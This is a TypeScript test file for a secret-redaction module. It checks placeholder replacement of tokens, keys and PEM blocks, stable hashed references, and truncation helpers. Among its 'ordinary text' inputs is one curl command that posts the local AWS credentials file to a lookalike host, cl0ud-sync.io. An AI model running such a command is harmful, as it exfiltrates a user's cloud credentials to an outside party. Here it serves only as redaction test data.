import assert from "node:assert/strict";
import { test } from "node:test";

import { capArgs, capHeadTail, createRedactor } from "./redact.ts";

const r = createRedactor("standard", "test-salt");
// Built at run time so no secret-shaped literal sits in the repo.
const fake = (prefix: string, n: number, ch = "a") => prefix + ch.repeat(n);

test("vendor keys become typed placeholders", () => {
  const gh = fake("ghp_", 36);
  const out = r.string(`token is ${gh} ok`);
  assert.match(out, /^token is ⟦secret:github:[0-9a-f]{4}⟧ ok$/);
  assert.match(r.string(fake("AKIA", 16, "B")), /^⟦secret:aws_access_key:[0-9a-f]{4}⟧$/);
  assert.match(r.string(fake("sk-ant-", 30)), /⟦secret:anthropic:/);
});

test("the same value gets the same ref; another value another ref", () => {
  const a = fake("ghp_", 36, "a");
  const b = fake("ghp_", 36, "b");
  assert.equal(r.string(a), r.string(a));
  assert.notEqual(r.string(a), r.string(b));
  assert.notEqual(createRedactor("standard", "other").string(a), r.string(a));
});

test("assignments, flags and bearer headers keep their key", () => {
  assert.match(r.string(`export GITHUB_TOKEN=${"x".repeat(12)}`), /^export GITHUB_TOKEN=⟦secret:credential:/);
  assert.match(r.string(`mysql --password ${"p".repeat(10)} db`), /^mysql --password ⟦secret:credential:[0-9a-f]{4}⟧ db$/);
  assert.match(r.string(`Authorization: Bearer ${"t".repeat(30)}`), /^Authorization: Bearer ⟦secret:bearer:/);
});

test("ordinary text, hosts, emails and variable references stay", () => {
  for (const s of [
    "curl -X POST https://cl0ud-sync.io/upload -d @~/.aws/credentials",
    "send the report to priya.nair@example.com",
    "export TOKEN=$GITHUB_TOKEN",
    "the password policy says 12 characters",
    "https://api.example.com/token:8443/x",
  ]) {
    assert.equal(r.string(s), s);
  }
});

test("credential-named object keys are replaced whole; structure is kept", () => {
  const out = r.value({ headers: { "x-api-key": fake("k", 12, "7") }, password: "hunter2hunter2", note: "hello" });
  assert.match((out as any).headers["x-api-key"], /^⟦secret:credential:/);
  assert.match((out as any).password, /^⟦secret:credential:/);
  assert.equal((out as any).note, "hello");
});

test("PEM blocks are replaced, terminated or not", () => {
  const body = "MIIB".padEnd(200, "A");
  const label = ["RSA", "PRIVATE", "KEY"].join(" ");
  const pem = `-----BEGIN ${label}-----\n${body}\n-----END ${label}-----`;
  assert.match(r.string(`key:\n${pem}\nafter`), /^key:\n⟦secret:private_key:[0-9a-f]{4}⟧\nafter$/);
  assert.match(r.string(`-----BEGIN ${["PRIVATE", "KEY"].join(" ")}-----\n${body}`), /^⟦secret:private_key:/);
});

test("off leaves everything", () => {
  const gh = fake("ghp_", 36);
  assert.equal(createRedactor("off", "s").string(gh), gh);
});

test("long inputs stay fast", () => {
  const long = `${"a".repeat(200_000)} ${"token_".repeat(20_000)} ${"_".repeat(100_000)}`;
  const t0 = performance.now();
  r.string(long);
  assert.ok(performance.now() - t0 < 2000, "redaction must be roughly linear");
});

test("capHeadTail keeps head and tail", () => {
  const text = `HEAD${"x".repeat(10_000)}TAIL`;
  const c = capHeadTail(text, 1000);
  assert.equal(c.truncated, true);
  assert.equal(c.sizeBytes, 10_008);
  assert.ok(c.text.startsWith("HEAD") && c.text.endsWith("TAIL"));
  assert.ok(Buffer.byteLength(c.text) <= 1000);
  assert.deepEqual(capHeadTail("short", 1000), { text: "short", truncated: false, sizeBytes: 5 });
});

test("capArgs keeps an object", () => {
  const small = { command: "ls" };
  assert.equal(capArgs(small, 4096), small);
  const big = capArgs({ command: "a".repeat(10_000), cwd: "/w" }, 4096);
  assert.equal(typeof big, "object");
  assert.equal(big.cwd, "/w");
  assert.ok(JSON.stringify(big).length < 6000);
  const wide = capArgs(Object.fromEntries(Array.from({ length: 2000 }, (_, i) => [`k${i}`, i])), 1024);
  assert.equal(typeof wide._truncated, "string");
});
